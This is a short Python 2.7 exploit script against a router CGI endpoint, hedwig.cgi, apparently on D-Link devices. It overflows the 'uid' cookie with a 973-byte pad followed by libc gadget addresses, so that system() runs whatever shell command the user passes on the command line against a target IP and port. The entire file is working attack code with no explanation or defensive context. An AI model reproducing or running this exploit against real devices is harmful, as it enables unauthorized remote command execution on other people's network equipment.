#!/usr/bin/env python2.7
from struct import *
import sys
import requests

# variables
offset = 973
LibcBase = 0x2aaf8000
System = 0x000531FF
CalcSystem = 0x000158C8
CallSystem = 0x000159CC
cmd = sys.argv[3]

# building shellcode
# note : pack("<Q", variables) fails for unknown reason
shellcode = "a"*offset
shellcode += pack("I", LibcBase + System) 
shellcode += "a"*16
shellcode += pack("I", LibcBase + CallSystem)
shellcode += "a"*12
shellcode += pack("I", LibcBase + CalcSystem)
shellcode += "a"*16
shellcode += cmd
print shellcode
# request
cookies = {'uid': shellcode}
data = {'ls': 'adsfasd'}
headers = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Cookie': 'uid='+shellcode}
req = requests.post("http://"+sys.argv[1]+":"+sys.argv[2]+"/hedwig.cgi", headers=headers, data=data)

# recieve response
print req.headers
print req.text
